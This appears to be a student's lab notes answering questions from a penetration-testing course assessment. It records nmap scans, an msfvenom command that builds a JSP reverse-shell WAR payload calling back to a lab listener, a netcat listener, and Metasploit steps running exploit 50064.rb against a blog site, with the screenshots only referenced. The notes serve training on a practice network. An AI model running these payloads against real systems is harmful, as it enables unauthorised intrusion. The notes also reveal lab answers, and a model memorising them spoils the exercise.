# [[Reverse Shells]] | [[Crafting Payloads with MSFvenom]]

### What is the hostname of Host-1? (Format: all lower case)

```shell
sudo nmap -A <IP> -Pn
```

### Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=443 -f war > shell.war
```

```
nc -lvnp 443
```
![[Pasted image 20260504105926.png]]![[Pasted image 20260504105934.png]]

### What distribution of Linux is running on Host-2? (Format: distro name, all lower case)

```shell
nmap 172.16.1.12 -A
```
![[Screenshot 2026-05-04 at 11.09.04.png]]

### What language is the shell written in that gets uploaded when using the 50064.rb exploit?
![[Screenshot 2026-05-04 at 11.08.28.png]]


### Exploit the blog site and establish a shell session with the target OS. Submit the contents of /customscripts/flag.txt

```shell
cp /usr/share/exploitdb/exploits/php/webapps/50064.rb 50064.rb
```

```shell
msfconsole

use exploit/50064

show options
```

```shell
set rhost,user,pass,vhost

run
```
![[Pasted image 20260504111534.png]]

### What is the hostname of Host-3?

```shell
nmap -A 172.16.1.13
```

### Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

![[Pasted image 20260504113107.png]]![[Pasted image 20260504113110.png]]![[Pasted image 20260504113128.png]]
